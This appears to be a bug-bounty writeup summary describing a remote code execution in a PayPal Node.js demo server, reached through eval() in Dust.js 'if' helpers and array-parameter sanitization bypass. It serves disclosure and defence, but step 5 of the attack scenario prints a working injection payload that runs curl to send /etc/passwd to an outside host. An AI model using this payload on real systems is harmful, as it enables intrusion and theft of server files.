# PayPal Node.js Code Injection via Dust.js Template Engine (RCE)

## Metadata
- **Source:** writeups.io
- **Date:** 2026-06-06
- **Author:** Various
- **Program:** PayPal
- **Bounty:** $10,000
- **Severity:** critical
- **Vuln types:** Code Injection, Remote Code Execution, Template Injection, Unsafe Eval Usage, Type Confusion
- **Category:** memory-binary
- **Writeup:** http://artsploit.blogspot.com/2016/08/pprce2.html

## Summary
PayPal's demo server used the Dust.js templating engine with unsafe eval() in the 'if' helper function. Although the application attempted to sanitize dangerous characters by HTML-encoding quotes, it failed to account for array parameter parsing, allowing an attacker to bypass sanitization and achieve remote code execution.

## Attack scenario (step by step)
1. Attacker fuzzes HTTP parameters and discovers the application responds differently to backslashes and newlines, indicating error handling
2. Error messages reveal the use of Dust.js templating engine with 'if' helpers that internally use eval()
3. Attacker identifies that single/double quotes are HTML-encoded for sanitization, blocking direct string escape
4. Attacker crafts array parameters using Node.js qs module parsing (device[]=value) to bypass type-dependent sanitization checks
5. Attacker constructs payload with device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-' to inject code
6. Server processes array instead of string, skipping HTML encoding sanitization, and eval() executes arbitrary JavaScript code with command execution

## Root cause
The application relied on character-level HTML encoding (quote sanitization) without validating parameter types. The Dust.js 'if' helper's use of eval() combined with the qs module's array parsing created a type confusion vulnerability where array parameters bypassed string-based sanitization controls.

## Attacker mindset
Systematic fuzzing to identify error behaviors, source code analysis to understand templating logic, exploitation of type coercion in Node.js parameter parsing, and leveraging unsafe eval() for command execution.

## Defensive takeaways
- Never use eval() for expression evaluation; use safe expression parsers or sandboxed environments
- Sanitization must be type-aware and handle all possible parameter types (strings, arrays, objects)
- Validate and enforce strict parameter types at the parsing layer before any processing
- Use template engines with sandboxed execution or disable dangerous features like eval-based helpers
- Implement Content Security Policy and disable dangerous JavaScript capabilities
- Prefer whitelisting over blacklisting for security controls
- Conduct comprehensive testing across different parameter formats (arrays, objects, primitives)

## Variant hunting
Search for other endpoints using Dust.js 'if' helpers, similar eval()-based templating engines (Handlebars, EJS with eval), array parameter handling in different Node.js applications, and other sanitization bypasses via type confusion (object vs string parameters in other frameworks).

## MITRE ATT&CK
- T1190
- T1059
- T1203
- T1668

## Notes
This vulnerability demonstrates the critical danger of eval() in server-side code and the importance of type-aware input validation. The $10,000 bounty reflected the severity of RCE on a major payment processor. The fix required removing eval() from Dust.js helpers and implementing proper expression evaluation.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-06-06*
